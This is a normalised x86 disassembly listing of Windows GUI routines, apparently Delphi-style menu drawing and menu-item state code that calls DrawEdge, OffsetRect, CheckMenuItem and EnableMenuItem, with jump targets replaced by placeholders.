mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41ce58
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41ce60
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41ce60
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d204
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41ce58
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_423670
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41ce34
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d204
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d204
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44f7db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42261c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41c694
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44b624
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41ce60
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44e838
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41c960
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d628
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d350
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44bb3c
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d628
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d158
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41c694
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_40326c
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44e838
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fc9f
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44d8fc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41d488
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_44e838
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44fdec
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_4507d0
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_44fe1c
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_44fe68
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45004a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403468
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_44fe1c
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_4507d0
mov esi eax
mov eax edi
call sub_44fdec
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4043c8
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c88
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404054
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_44d8fc
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4042c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450051
lea eax [ ebp - 0x24 ]
call sub_403fbc
lea eax [ ebp - 0x10 ]
call sub_403fbc
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_44e838
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_45007c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4043c8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404010
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4500a4
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_450214
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_450224
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_4500ec
sub_4500ec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44e7a8
push eax
call CheckMenuItem
mov eax esi
call sub_4500a4
sub_450140
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_450214
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44e7a8
push eax
call EnableMenuItem
sub_4501b8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_450578
mov edx eax
mov ecx ebx
mov eax edi
call sub_44e748
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_4500a4
sub_450224
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4139c8
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44d850
sub_450294
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_450214
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_45027c
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_4505ac
mov ecx ebx
mov edx esi
mov eax edi
call sub_4503a0
sub_4502dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450214
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_450224
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_450334
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_450214
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_450224
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_450224
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_4503a0
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44d850
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_44e748
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_413a44
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_450618
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_450214
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44e678
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4139c8
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4139c8
mov dl [ eax + 0x3f ]
mov eax esi
call sub_4501b8
sub_450454
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_44d850
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_450214
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44e678
mov eax ebx
call sub_450214
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4139c8
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4138b8
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_4504c8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_4500ec
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4501fc
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_4501fc
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_450590
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450214
mov edx eax
mov ecx esi
mov eax ebx
call sub_4503a0
pop esi
pop ebx
retn
sub_4505ac
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_450578
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_450454
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44d850
sub_4505d4
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_450618
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
